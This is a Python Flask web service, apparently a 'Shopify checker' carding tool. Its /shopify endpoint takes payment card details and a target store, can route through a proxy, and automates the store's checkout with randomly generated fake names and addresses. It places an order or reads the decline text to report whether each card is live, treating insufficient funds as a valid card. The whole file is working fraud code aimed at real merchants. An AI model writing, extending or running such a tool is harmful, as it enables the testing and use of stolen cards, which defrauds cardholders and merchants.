import os
import re
import json
import random
import logging
import time
import requests
from flask import Flask, request, jsonify
from urllib.parse import urljoin, urlparse
from datetime import datetime

# ===== CONFIGURATION =====
LOG_FILE = "shopify_api.log"
LOG_LEVEL = logging.DEBUG  # Change to INFO for production

# ===== LOGGING SETUP =====
logging.basicConfig(
    level=LOG_LEVEL,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("ShopifyAPI")

# ===== FLASK APP =====
app = Flask(__name__)

# ===== FAKE ADDRESS GENERATOR =====
FIRST_NAMES = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles","Christopher","Daniel","Matthew","Anthony","Mark","Donald","Steven","Paul","Andrew","Joshua","Kenneth","Kevin","Brian","Timothy","Ronald","Edward","Jason","Jeffrey","Ryan","Jacob","Gary","Nicholas","Eric","Jonathan","Stephen","Larry","Justin","Scott","Brandon","Benjamin","Samuel","Raymond","Gregory","Frank","Alexander","Patrick","Jack","Dennis","Jerry","Tyler","Aaron","Jose","Nathan","Adam","Henry","Zachary","Todd","Walter","Kyle","Carl","Peter","George","Dylan","Ethan","Jordan","Noah","Caleb","Logan","Hunter","Evan","Christian","Mason","Cameron","Aiden","Liam","Emma","Olivia","Ava","Sophia","Isabella","Mia","Charlotte","Amelia","Harper","Evelyn","Abigail","Emily","Elizabeth","Sofia","Avery","Ella","Madison","Scarlett","Victoria","Aria","Grace","Chloe","Camila","Penelope","Riley"]
LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez","Hernandez","Lopez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson","White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson","Walker","Young","Allen","King","Wright","Scott","Torres","Nguyen","Hill","Flores","Green","Adams","Nelson","Baker","Hall","Rivera","Campbell","Mitchell","Carter","Roberts","Turner","Phillips","Campbell","Parker","Evans","Edwards","Collins","Stewart","Morris","Morales","Murphy","Cook","Rogers","Morgan","Peterson","Cooper","Reed","Bailey","Bell","Howard","Ward","Cox","Diaz","Richardson","Wood","Watson","Brooks","Bennett","Gray","James","Reyes","Cruz","Hughes","Price","Myers","Long","Foster","Sanders","Ross","Powell","Sullivan","Russell","Ortiz","Jenkins","Perry","Butler","Barnes","Fisher","Henderson","Coleman","Simmons","Patterson"]
STREETS = ["Main St","Oak Ave","Pine St","Maple Dr","Cedar Ln","Elm St","Washington Ave","Lake St","Hill St","Park Ave","Church St","Market St","Broadway","High St","Water St","School St","Second St","First St","Mill St","Union St","Franklin Ave","Elmwood Ave","Greenwood Ave","Highland Ave","Chestnut St","Lincoln St","Willow Ave","North St","South St","West St","East St","State St","Cottage Ave","Walnut St","Prospect St","Fairview Ave","Maplewood Ave","Pleasant St","Cedar Ave","Riverside Dr"]
CITIES = ["New York","Los Angeles","Chicago","Houston","Phoenix","Philadelphia","San Antonio","San Diego","Dallas","Austin","Jacksonville","Fort Worth","Columbus","Charlotte","San Francisco","Indianapolis","Seattle","Denver","Washington","Boston","El Paso","Nashville","Detroit","Oklahoma City","Portland","Las Vegas","Memphis","Louisville","Baltimore","Milwaukee","Albuquerque","Tucson","Fresno","Sacramento","Kansas City","Mesa","Atlanta","Omaha","Colorado Springs","Raleigh","Long Beach","Virginia Beach","Miami","Oakland","Minneapolis","Tulsa","Arlington","New Orleans","Wichita","Cleveland","Tampa","Bakersfield","Aurora","Anaheim","Honolulu","Santa Ana","Riverside","Corpus Christi","Lexington","Stockton","St. Louis","Pittsburgh","Saint Paul","Cincinnati","Anchorage","Newark","Plano","Lincoln","Orlando","Irvine","Newport News","Chula Vista","Durham","Fort Wayne","Reno","Toledo","New Haven","Providence","Baton Rouge","Grand Rapids","Columbia","Akron","Fayetteville","Cape Coral","Oxnard","Glendale","Huntsville","Salem","Port St. Lucie","Springfield","Pasadena","Fort Lauderdale","Rockford","Tallahassee","Paterson","Killeen","Overland Park","Savannah","Yonkers","Worcester","Syracuse","Midland","Augusta","Montgomery","Little Rock","Amarillo","Pembroke Pines","Hampton","Eugene","Visalia","Fort Collins"]
STATES = ["AL","AK","AZ","AR","CA","CO","CT","DE","FL","GA","HI","ID","IL","IN","IA","KS","KY","LA","ME","MD","MA","MI","MN","MS","MO","MT","NE","NV","NH","NJ","NM","NY","NC","ND","OH","OK","OR","PA","RI","SC","SD","TN","TX","UT","VT","VA","WA","WV","WI","WY"]

def generate_address():
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    return {
        "first_name": first,
        "last_name": last,
        "address1": f"{random.randint(100,9999)} {random.choice(STREETS)}",
        "city": random.choice(CITIES),
        "province": random.choice(STATES),
        "zip": str(random.randint(10000,99999)),
        "country": "US",
        "phone": f"{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}",
        "email": f"{first.lower()}{random.randint(100,999)}@gmail.com"
    }

# ===== SHOPIFY CHECKER ENGINE =====
def shopify_check(store_url, card_number, month, year, cvv, proxy=None):
    """
    Main checkout function. Returns dict with Status, Response, Gateway, Price.
    """
    logger.info(f"Starting checkout for store: {store_url}, card ending: {card_number[-4:]}")
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    })
    if proxy:
        logger.debug(f"Using proxy: {proxy}")
        session.proxies = {"http": proxy, "https": proxy}

    try:
        # 1. Find product handle from store homepage
        logger.debug("Fetching store homepage...")
        resp = session.get(store_url, timeout=10)
        if resp.status_code != 200:
            logger.warning(f"Store homepage returned {resp.status_code}")
            return {"Status": False, "Response": f"Store unreachable (HTTP {resp.status_code})", "Gateway": "shopiii", "Price": "-"}
        # Find first product link
        matches = re.findall(r'href="([^"]*\/products\/[^"]+)"', resp.text)
        handle = None
        for match in matches:
            parts = match.split('/products/')
            if len(parts) > 1:
                handle = parts[1].split('?')[0].split('#')[0]
                if handle:
                    break
        if not handle:
            logger.warning("No product found on homepage")
            return {"Status": False, "Response": "No product found", "Gateway": "shopiii", "Price": "-"}
        logger.debug(f"Found product handle: {handle}")

        # 2. Get variant ID from product page
        product_url = urljoin(store_url, f"/products/{handle}")
        logger.debug(f"Fetching product page: {product_url}")
        resp = session.get(product_url, timeout=10)
        if resp.status_code != 200:
            logger.warning(f"Product page returned {resp.status_code}")
            return {"Status": False, "Response": "Product page unavailable", "Gateway": "shopiii", "Price": "-"}
        variant_id = None
        # Try multiple patterns
        patterns = [
            r'"id":(\d+),.*?"sku"',
            r'<input[^>]*name="id"[^>]*value="(\d+)"',
            r'variant_id=(\d+)',
            r'"id":(\d+),"title"'
        ]
        for pat in patterns:
            match = re.search(pat, resp.text)
            if match:
                variant_id = match.group(1)
                break
        if not variant_id:
            logger.warning("Variant ID not found")
            return {"Status": False, "Response": "Variant ID not found", "Gateway": "shopiii", "Price": "-"}
        logger.debug(f"Variant ID: {variant_id}")

        # 3. Add to cart
        add_url = urljoin(store_url, "/cart/add.js")
        logger.debug("Adding to cart...")
        add_payload = {"items": [{"id": int(variant_id), "quantity": 1}]}
        resp = session.post(add_url, json=add_payload, timeout=10)
        if resp.status_code != 200:
            logger.warning(f"Add to cart failed: {resp.status_code}")
            return {"Status": False, "Response": "Add to cart failed", "Gateway": "shopiii", "Price": "-"}
        logger.debug("Added to cart successfully")

        # 4. Go to checkout and extract token and field names
        checkout_url = urljoin(store_url, "/checkout")
        logger.debug("Fetching checkout page...")
        resp = session.get(checkout_url, timeout=10)
        if resp.status_code != 200:
            logger.warning(f"Checkout page failed: {resp.status_code}")
            return {"Status": False, "Response": "Checkout page unavailable", "Gateway": "shopiii", "Price": "-"}

        # Extract checkout token
        token = None
        match = re.search(r'name="checkout\[token\]"\s+value="([^"]+)"', resp.text)
        if match:
            token = match.group(1)
        if not token:
            match = re.search(r'checkout_token["\']?\s*[:=]\s*["\']([^"\']+)', resp.text)
            if match:
                token = match.group(1)
        if not token:
            logger.warning("Checkout token not found")
            return {"Status": False, "Response": "Checkout token missing", "Gateway": "shopiii", "Price": "-"}
        logger.debug(f"Checkout token: {token[:20]}...")

        # Extract authenticity token if present
        auth_token = None
        match = re.search(r'name="authenticity_token"\s+value="([^"]+)"', resp.text)
        if match:
            auth_token = match.group(1)

        # Dynamically find credit card input field names
        card_fields = {}
        inputs = re.findall(r'<input[^>]*name="([^"]+)"[^>]*>', resp.text)
        for inp in inputs:
            if 'number' in inp.lower() and 'card' in inp.lower():
                card_fields['number'] = inp
            elif 'month' in inp.lower() and 'card' in inp.lower():
                card_fields['month'] = inp
            elif 'year' in inp.lower() and 'card' in inp.lower():
                card_fields['year'] = inp
            elif 'verification' in inp.lower() or 'cvv' in inp.lower():
                card_fields['cvv'] = inp
        # Fallback to standard names
        if not card_fields:
            card_fields = {
                'number': 'checkout[credit_card][number]',
                'month': 'checkout[credit_card][month]',
                'year': 'checkout[credit_card][year]',
                'cvv': 'checkout[credit_card][verification_value]'
            }
        logger.debug(f"Card fields: {card_fields}")

        # Find shipping rate options (pick first)
        rate_options = re.findall(r'<input[^>]*name="checkout\[shipping_rate_id\]"[^>]*value="([^"]+)"', resp.text)
        shipping_rate = rate_options[0] if rate_options else "1"
        # Find checkout step
        step = None
        match = re.search(r'name="checkout\[step\]"\s+value="([^"]+)"', resp.text)
        if match:
            step = match.group(1)
        if not step:
            step = "payment_method"

        # 5. Generate fake address
        addr = generate_address()
        logger.debug(f"Generated address: {addr['first_name']} {addr['last_name']}, {addr['city']}")

        # 6. Build payload
        payload = {
            "authenticity_token": auth_token or "",
            "utf8": "✓",
            "_method": "patch",
            "button": "",
            "checkout[token]": token,
            "checkout[email]": addr["email"],
            "checkout[shipping_address][first_name]": addr["first_name"],
            "checkout[shipping_address][last_name]": addr["last_name"],
            "checkout[shipping_address][address1]": addr["address1"],
            "checkout[shipping_address][city]": addr["city"],
            "checkout[shipping_address][province]": addr["province"],
            "checkout[shipping_address][zip]": addr["zip"],
            "checkout[shipping_address][country]": "US",
            "checkout[shipping_address][phone]": addr["phone"],
            "checkout[shipping_rate_id]": shipping_rate,
            "checkout[step]": step,
            "checkout[payment_gateway]": "shopify_payments",
            "checkout[remember_me]": "0"
        }
        # Add card fields dynamically
        payload[card_fields['number']] = card_number
        payload[card_fields['month']] = month
        payload[card_fields['year']] = year
        payload[card_fields['cvv']] = cvv
        payload[card_fields.get('name', 'checkout[credit_card][name]')] = f"{addr['first_name']} {addr['last_name']}"

        # 7. Submit checkout
        logger.debug("Submitting checkout...")
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": checkout_url,
            "Origin": urlparse(checkout_url).netloc
        }
        resp = session.post(checkout_url, data=payload, headers=headers, timeout=30)

        # 8. Analyze response
        if "thank_you" in resp.url.lower() or "order_confirmation" in resp.url.lower():
            logger.info(f"✅ Order placed for card ending {card_number[-4:]}")
            return {"Status": True, "Response": "Order placed", "Gateway": "shopiii", "Price": "20.0"}
        elif "insufficient_funds" in resp.text.lower():
            logger.info(f"💳 Insufficient funds for card ending {card_number[-4:]}")
            return {"Status": True, "Response": "INSUFFICIENT_FUNDS", "Gateway": "shopiii", "Price": "20.0"}
        elif "declined" in resp.text.lower() or "payment declined" in resp.text.lower():
            logger.info(f"❌ Card declined for card ending {card_number[-4:]}")
            return {"Status": False, "Response": "Card declined", "Gateway": "shopiii", "Price": "-"}
        elif "invalid" in resp.text.lower():
            logger.info(f"❌ Invalid card details for card ending {card_number[-4:]}")
            return {"Status": False, "Response": "Invalid card details", "Gateway": "shopiii", "Price": "-"}
        else:
            # Try to extract error message from page
            error_match = re.search(r'<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</div>', resp.text, re.DOTALL)
            if error_match:
                error_msg = error_match.group(1).strip()
                logger.warning(f"Checkout error: {error_msg}")
                return {"Status": False, "Response": error_msg, "Gateway": "shopiii", "Price": "-"}
            logger.warning(f"Unknown checkout result for card ending {card_number[-4:]}")
            return {"Status": False, "Response": "Checkout failed (unknown reason)", "Gateway": "shopiii", "Price": "-"}

    except requests.exceptions.Timeout:
        logger.error(f"Timeout for store: {store_url}")
        return {"Status": False, "Response": "Request timeout", "Gateway": "shopiii", "Price": "-"}
    except requests.exceptions.ProxyError as e:
        logger.error(f"Proxy error: {e}")
        return {"Status": False, "Response": f"Proxy error: {str(e)[:50]}", "Gateway": "shopiii", "Price": "-"}
    except Exception as e:
        logger.error(f"Unexpected error: {e}", exc_info=True)
        return {"Status": False, "Response": f"Error: {str(e)[:50]}", "Gateway": "shopiii", "Price": "-"}

# ===== API ENDPOINT =====
@app.route('/shopify', methods=['GET'])
def shopify_endpoint():
    start_time = time.time()
    cc = request.args.get('cc')
    site = request.args.get('site')
    proxy = request.args.get('proxy', '')

    # Validate inputs
    if not cc or not site:
        logger.warning("Missing cc or site parameter")
        return jsonify({"Status": False, "Response": "Missing cc or site parameter", "Gateway": "shopiii", "Price": "-"})

    # Parse card
    parts = cc.split('|')
    if len(parts) != 4:
        logger.warning(f"Invalid card format: {cc}")
        return jsonify({"Status": False, "Response": "Invalid card format (must be number|mm|yy|cvv)", "Gateway": "shopiii", "Price": "-"})
    number, month, year, cvv = parts
    number = re.sub(r'\D', '', number)
    if len(number) not in [15,16]:
        logger.warning(f"Invalid card number length: {len(number)}")
        return jsonify({"Status": False, "Response": "Invalid card number length", "Gateway": "shopiii", "Price": "-"})
    month = month.strip().zfill(2)
    if len(year) == 2:
        year = '20' + year
    year = year[-2:]  # Keep last 2 digits for Shopify
    if len(cvv) not in [3,4]:
        logger.warning(f"Invalid CVV length: {len(cvv)}")
        return jsonify({"Status": False, "Response": "Invalid CVV length", "Gateway": "shopiii", "Price": "-"})

    # Clean site
    site = site.replace('https://', '').replace('http://', '').rstrip('/')
    store_url = f"https://{site}"

    logger.info(f"Received request: card={number[:6]}...{number[-4:]}, site={site}, proxy={'yes' if proxy else 'no'}")

    # Execute checkout
    result = shopify_check(store_url, number, month, year, cvv, proxy if proxy else None)

    # Log response time
    elapsed = time.time() - start_time
    logger.info(f"Request completed in {elapsed:.2f}s, result: {result.get('Status')} - {result.get('Response', '')[:50]}")

    return jsonify(result)

@app.route('/health', methods=['GET'])
def health_check():
    """Simple health check endpoint."""
    return jsonify({
        "status": "ok",
        "timestamp": datetime.utcnow().isoformat(),
        "version": "1.0"
    })

# ===== MAIN =====
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
